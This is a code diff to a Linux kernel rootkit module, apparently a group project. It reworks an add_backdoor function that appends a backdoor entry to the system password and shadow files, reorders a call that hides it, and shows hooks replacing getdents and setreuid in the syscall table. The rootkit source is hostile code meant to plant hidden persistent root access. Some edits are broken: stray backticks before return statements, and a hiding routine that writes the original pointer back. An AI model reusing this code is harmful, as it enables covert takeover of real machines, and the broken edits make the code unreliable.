@@ -86,14 +86,16 @@ void add_backdoor(char *path) {
 	    	set_fs(old_fs); 
 
 	    	if(IS_ERR(file)){
-			goto exit;
+			return;
 	    	}
 
 	    	//check if backdoor already exists
 	    	buffer = (char *) kmalloc(PAGE_SIZE, GFP_KERNEL);
 
 	    	if(!buffer){
-			goto cleanup1;
+			 if(file)
+			 	{filp_close(file, NULL);}
+			return;
 	    	}
 
 	    	backdoor_existing = false;
@@ -107,7 +109,11 @@ void add_backdoor(char *path) {
 			set_fs(old_fs);
 
 			if(ret < 0){
-		    		goto cleanup2;
+		    		if(buffer)
+					{kfree(buffer);}
+		    	if(file)
+		    		{filp_close(file, NULL);}
+		`	return;
 			}
 
 			page_count++;
@@ -119,7 +125,13 @@ void add_backdoor(char *path) {
 	    	}
 
 	    	if(backdoor_existing){
-			goto cleanup2;
+			
+			if(buffer)
+				{kfree(buffer);}
+		    if(file)
+		    	{filp_close(file, NULL);}
+		`return;
+			
 		    }
 
 	    	//seek offset to end of file
@@ -130,35 +142,45 @@ void add_backdoor(char *path) {
 	    	set_fs(old_fs);
 
 	    	if(offset < 0){
-			goto cleanup2;
+			
+			if(buffer)
+				{kfree(buffer);}
+		    if(file)
+		    	{filp_close(file, NULL);}
+		`return;
+			
 		}
 
-		//add backdoor to the end of file
+		//insert backdoor to the end of file
 		ret = 0;
 	    	set_fs(get_ds()); 
 		ret = vfs_write(file, backdoor, strlen(backdoor),&offset); 
 		set_fs(old_fs); 
 	
 		if(ret<0){
-			goto cleanup2;
+			if(buffer)
+				{kfree(buffer);}
+		    if(file)
+		    	{filp_close(file, NULL);}
+		`return;
 	    	}
 
-		cleanup2:
-		    if(buffer)
-			kfree(buffer);
+// 		cleanup2:
+// 		    if(buffer)
+// 			kfree(buffer);
 	
-		cleanup1:
-		    if(file)
-			filp_close(file, NULL);
+// 		cleanup1:
+// 		    if(file)
+// 			filp_close(file, NULL);
 	
-		exit:
-		    return;
+// 		exit:
+// 		    return;
 }
 
 void hide_backdoor (void) {
 	
 original_getdents = (void *)sys_call_address[__NR_index];                        \
-    sys_call_address[__NR_index] = (unsigned long*)&original_getdents
+    sys_call_address[__NR_index] = (unsigned long*)&original_getdents;
 	
 }
 
@@ -287,7 +309,6 @@ static int __init rootkit_init(void){
 	add_backdoor(password_file);
    	add_backdoor(shadow_file);
 	
-	hide_backdoor();
 	// End Marc
 	
 	printk(KERN_INFO "sys_call_table Address is: %X\n", *sys_call_address);
@@ -298,6 +319,8 @@ static int __init rootkit_init(void){
 	sys_call_address[__NR_getdents] = (void*)&sys_getdents_hook; // Replace the pointer on the table with our hook
 	// End Brian
 
+	hide_backdoor();
+	
 	// Start Brendan
 	old_setreuid = sys_call_address[__NR_setreuid];
 	sys_call_address[__NR_setreuid] = our_setreuid;
